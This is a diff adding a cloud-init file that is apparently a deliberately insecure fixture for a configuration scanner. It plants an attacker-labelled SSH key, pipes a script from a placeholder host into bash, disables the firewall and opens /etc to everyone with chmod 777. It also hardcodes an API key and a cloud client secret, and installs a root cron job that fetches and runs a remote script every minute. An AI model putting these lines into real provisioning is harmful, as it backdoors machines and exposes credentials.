@@ -1,0 +1,32 @@
+#cloud-config
+package_update: true
+package_upgrade: false
+
+packages:
+  - postgresql
+
+ssh_authorized_keys:
+  - ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCfake attacker@lab
+
+write_files:
+  - path: /etc/cloudsentinel/role.txt
+    owner: root:root
+    permissions: "0644"
+    content: |
+      role=${vm_role}
+
+runcmd:
+  - [bash, -lc, "curl https://example.invalid/install.sh | bash"]
+  - [bash, -lc, "ufw disable"]
+  - [bash, -lc, "chmod 777 /etc"]
+  - [bash, -lc, "export api_key=123456789abcdef"]
+  - [
+      bash,
+      -lc,
+      "export ARM_CLIENT_SECRET=A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8S9t0",
+    ]
+  - [
+      bash,
+      -lc,
+      "echo '* * * * * root curl https://example.invalid/p.sh | bash' > /etc/cron.d/persist",
+    ]
